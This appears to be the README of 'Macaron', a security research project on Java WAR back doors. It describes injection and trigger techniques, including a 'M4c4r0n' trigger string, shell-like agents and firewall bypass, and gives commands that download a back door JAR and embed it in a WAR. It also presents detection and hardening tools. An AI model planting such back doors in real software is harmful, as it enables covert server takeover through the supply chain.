# Macaron Java back door #
![http://macaron.googlecode.com/svn/trunk/images/logo.png](http://macaron.googlecode.com/svn/trunk/images/logo.png)

In June 2009, I published a paper to explain how it's possible to inject a [back door](macaronBackdoor.md)
into a WAR file. I present my work at [SSTIC 09](http://www.sstic.org/SSTIC09/programme.do).

The idea is to inject a back door only with a presence of a JAR file
in `WEB-INF/lib`. An [English](http://macaron.googlecode.com/files/en-macaron.pdf) or [French](http://macaron.googlecode.com/files/macaron.pdf) report is published.

The back door use two strategies:
  * First, a trap to execute some hidden code without modify one line of code;
  * Second, an injection technique to capture all HTTP requests.

The different techniques to activate the trap are:
  * Add a parameter file, like `param.wsdd` for Axis in a privileged location;
  * Declare a service in `META-INF/services` (SAX or DOM parser are good candidates);
  * Add `META-INF/aop.xml` to use an aspect if possible;
  * Add a class to simulate a classical `ResourceBundle` file;
  * Add an annotation;
  * Use JSR269 to inject code during the compilation phase;

In a few case we need to upgrade the privileges to inject the trap.
It's possible for the trap to auto-upgrades its privileges after a reboot of the server.
To do that, the code copy the JAR file to $CATALINA\_HOME/lib and wait for the next start.
When the Tomcat server restart, the trap injects a code with a special resource bundle
used by Tomcat. Note: it's impossible if the Tomcat server use [sealed](macaronSeal.md) packages.

![http://macaron.googlecode.com/svn/trunk/images/injections.png](http://macaron.googlecode.com/svn/trunk/images/injections.png)

The injection steps:

  * Inject a Tomcat valve (it's difficult with Tomcat 5.5 because the class `ValveBase` is not accessible in the web application. After an upgrade of the privileges, it's possible. It's easy with Tomcat 6.x because all shared and servers classes are merged.)
  * Or, add a J2EE filter in cached version of `web.xml` and wait the next start ;
  * Or, use AOP to inject a code in each servlet/jsp ;
  * Or, dynamically patch the Spring configuration file, with a hook in XML parser, and inject a code in the MVC framework with a special `<bean/>`;
  * Without security, it's possible to inject code in each Singletons.

Then, wait for the string “`M4c4r0n`” in any fields to open the door (a French very good cookie).

The code presents different agents with a shell like interface to manipulate the server
([history](historyAgent.md), [JNDI](jndiAgent.md), [JMX](jmxAgent.md), [JDBC](jdbcAgent.md),
[Java/javascript](javaAgent.md) or [Shell](shellAgent.md)).
Different techniques are used to bypass the web application firewall.

![http://macaron.googlecode.com/svn/trunk/images/shell.png](http://macaron.googlecode.com/svn/trunk/images/shell.png)

You can see a short demonstration [here](http://prados.eu/macaron/demo.html)
or a version with a solution to detect this kind of code [here](http://prados.eu/macaron/macaron.html).

# Execute the back door #

You can test the code with:
```
$ # Download a WAR file
$ wget http://tomcat.apache.org/tomcat-5.5-doc/appdev/sample/sample.war
$ # Download the back door Macaron
$ wget http://macaron.googlecode.com/files/macaron-backdoor-1.0.jar
$ # Inject the back door in WAR file
$ mkdir -p WEB-INF/lib
$ mv macaron-backdoor*.jar WEB-INF/lib
$ jar -uf sample.war WEB-INF
$ # Deploy the WAR file Tomcat
$ cp sample.war $CATALINA_HOME/webapps
$ # Start Tomcat
$ export JAVA_OPTS="$JAVA_OPTS -Dmacaron-backdoor=i-take-responsibility-for-my-actions"
$ $CATALINA_HOME/bin/catalina.sh run
```

For security reason, the back door code is protected with a special system variable.
This kind of code can be propagated through a repository like [Maven](http://maven.apache.org)
or [Ivy](http://ant.apache.org/ivy) or be present in any component (open source or not).

# Solutions #
I propose three tools to detect and protect the java code.

The first solution is to use a start Tomcat with security option (`catalina.sh start -security`).
But, it's very difficult to set all privileges for a specific WAR with
all components. The tool [macaron-policy](macaronPolicy.md) can analyze a component, a JVM log
and policy file to add the new privileges.
I suggest adding a file `META INF/jar.policy` to initialize the policies for
a specific jar. If this resource is not present in the jar, it's possible to
use a database to associate a policy for each jar file.
I suggest a public database [here](http://code.google.com/p/macaron-policy/)
You can watch this [video](http://prados.eu/macaron/macaron.html) to understand the usage.

The tool [macaron-audit](macaronAudit.md) can analyze a component to detect suspicious files.

The tool [macaron-seal](macaronSeal.md) can add sealed flag in each package.
It's possible to do that for Tomcat :
```
macaron-audit --output - -R $CATALINA_HOME | \
 macaron-seal  --ignore - -R $CATALINA_HOME --in-place
```
This is a quick solution to have an hardened Tomcat.

But, it's not enough to protect a JVM. It's necessary to patch the JDK.
I propose a [patch](http://code.google.com/p/macaron/downloads/list?q=patch) for `ServiceLoader` to add a new privilege,
and another [patch](http://code.google.com/p/macaron/downloads/list?q=patch) for `ResourcesBundles`.